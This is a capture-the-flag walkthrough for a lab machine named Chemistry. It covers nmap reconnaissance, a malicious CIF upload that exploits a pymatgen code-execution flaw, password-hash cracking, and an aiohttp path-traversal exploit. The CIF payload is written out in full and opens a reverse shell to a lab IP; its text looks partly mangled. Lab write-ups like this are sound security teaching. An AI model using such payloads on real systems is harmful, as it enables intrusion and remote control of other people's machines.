---
title: CHEMISTRY
description: walkthrough
---

Difficulty: Easy

![image.png](../../../assets/Chemistry%20158ab0f53d1d806680acfa305c62a9df/image.png)

## Information Gathering Phase

### Nmap

```python
┌──(khem㉿kali)-[~]
└─$ nmap -sCV -v 10.10.11.38  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-10 08:47 EST

Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE    SERVICE        VERSION
22/tcp   open     ssh            OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
|_  256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
646/tcp  filtered ldp
900/tcp  filtered omginitialrefs
5000/tcp open     upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.9.5
|     Date: Tue, 10 Dec 2024 14:01:35 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 719
|     Vary: Cookie
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Chemistry - Home</title>
|     <link rel="stylesheet" href="/static/styles.css">
|     </head>
|     <body>
|     <div class="container">
|     class="title">Chemistry CIF Analyzer</h1>
|     <p>Welcome to the Chemistry CIF Analyzer. This tool allows you to upload a CIF (Crystallographic Information File) and analyze the structural data contained within.</p>
|     <div class="buttons">
|     <center><a href="/login" class="btn">Login</a>
|     href="/register" class="btn">Register</a></center>
|     </div>
|     </div>
|     </body>
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>

Completed NSE at 08:49, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 137.84 seconds
```

![image.png](../../../assets/Chemistry%20158ab0f53d1d806680acfa305c62a9df/image%201.png)

No credentials so signup

![image.png](../../../assets/Chemistry%20158ab0f53d1d806680acfa305c62a9df/image%202.png)

![image.png](../../../assets/Chemistry%20158ab0f53d1d806680acfa305c62a9df/image%203.png)

when I click the link “example.cif” file got downloaded
lets see what is that

![image.png](../../../assets/Chemistry%20158ab0f53d1d806680acfa305c62a9df/image%204.png)

have this kind of content

![image.png](../../../assets/Chemistry%20158ab0f53d1d806680acfa305c62a9df/image%205.png)

![image.png](../../../assets/Chemistry%20158ab0f53d1d806680acfa305c62a9df/image%206.png)

![image.png](../../../assets/Chemistry%20158ab0f53d1d806680acfa305c62a9df/image%207.png)

after file uploads

when I view it 

![image.png](../../../assets/Chemistry%20158ab0f53d1d806680acfa305c62a9df/image%208.png)

that means it is being executed when view is clicked 
how can I use the cif file for exploitation? or reverse shell

![image.png](../../../assets/Chemistry%20158ab0f53d1d806680acfa305c62a9df/image%209.png)

![image.png](../../../assets/Chemistry%20158ab0f53d1d806680acfa305c62a9df/image%2010.png)

[Arbitrary code execution when parsing a maliciously crafted JonesFaithfulTransformation transformation_string](https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f)

I am confident that, I can take advantage of the cif file to get reverse shell, as the cif file is being executed by the application 

Now lets craft the cif file that would give us reverse shell for the above link 

```python
data_Example
_cell_length_a 10.00000
_cell_length_b 10.00000
_cell_length_c 10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta 90.00000 _cell_angle_gamma 90.00000
_symmetry_space_group_name_H-M 'P 1'
loop_
_atom_site_label
_atom_site_fract_x
_atom_site_fract_y
_atom_site_fract_z
_atom_site_occupancy
H 0.00000 0.00000 0.00000 1
0 0.50000 0.50000 0.50000 1
_space_group_magn.transform_BNS_Pp_abc 'a,b,[d for d in
().__class____mro__[1].__getattribute___ ( *[().__class____mro__[1]]+["____sub" + "classes____"]) 0
if d.____name____ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'sh -i >& /dev/tcp/10.10.16.24/4444 0>&1\"");0,0,0'
-space group magn.number BNS 62.448
-space group magn.name E BNS "P n' m a'"
```

![image.png](../../../assets/Chemistry%20158ab0f53d1d806680acfa305c62a9df/image%2011.png)

![image.png](../../../assets/Chemistry%20158ab0f53d1d806680acfa305c62a9df/image%2012.png)

![image.png](../../../assets/Chemistry%20158ab0f53d1d806680acfa305c62a9df/image%2013.png)

![image.png](../../../assets/Chemistry%20158ab0f53d1d806680acfa305c62a9df/image%2014.png)

there is a file called database.db 

![image.png](../../../assets/Chemistry%20158ab0f53d1d806680acfa305c62a9df/image%2015.png)

I download the database file and open it using sqlite3

![image.png](../../../assets/Chemistry%20158ab0f53d1d806680acfa305c62a9df/image%2016.png)

there is table called user

![image.png](../../../assets/Chemistry%20158ab0f53d1d806680acfa305c62a9df/image%2017.png)

there is username is hash 

![image.png](../../../assets/Chemistry%20158ab0f53d1d806680acfa305c62a9df/image%2018.png)

I used crack station to crack the hash and got the password

now lets login to user rosa because there is user called rosa in home directory 

![image.png](../../../assets/Chemistry%20158ab0f53d1d806680acfa305c62a9df/image%2019.png)

![image.png](../../../assets/Chemistry%20158ab0f53d1d806680acfa305c62a9df/image%2020.png)

Now whats next?

### Lateral Movement

looking for the privilege of the use rosa

![image.png](../../../assets/Chemistry%20158ab0f53d1d806680acfa305c62a9df/image%2021.png)

rosa can run bash file 

I am logged in as rosa

rosa can execute shell command

![image.png](../../../assets/Chemistry%20158ab0f53d1d806680acfa305c62a9df/image%2022.png)

there was linpeas file so i run that one 

![image.png](../../../assets/Chemistry%20158ab0f53d1d806680acfa305c62a9df/image%2023.png)

result from the linpeas scan

there exist a server running on [localhost](http://localhost) port 8080

to check whether is it really running or not 

![image.png](../../../assets/Chemistry%20158ab0f53d1d806680acfa305c62a9df/image%2024.png)

it is python server 

![image.png](../../../assets/Chemistry%20158ab0f53d1d806680acfa305c62a9df/image%2025.png)

[CVE-2024-23334: A Deep Dive into aiohttp's Directory Traversal Vulnerability](https://ethicalhacking.uk/cve-2024-23334-aiohttps-directory-traversal-vulnerability/#gsc.tab=0)

this blog demonstrate the vulnerability of aiohttp/3.9.1

![image.png](../../../assets/Chemistry%20158ab0f53d1d806680acfa305c62a9df/image%2026.png)

[https://github.com/z3rObyte/CVE-2024-23334-PoC/blob/main/exploit.sh](https://github.com/z3rObyte/CVE-2024-23334-PoC/blob/main/exploit.sh)

![image.png](../../../assets/Chemistry%20158ab0f53d1d806680acfa305c62a9df/image%2027.png)

copy the code and modify the file path

![image.png](../../../assets/Chemistry%20158ab0f53d1d806680acfa305c62a9df/image%2028.png)

![image.png](../../../assets/Chemistry%20158ab0f53d1d806680acfa305c62a9df/image%2029.png)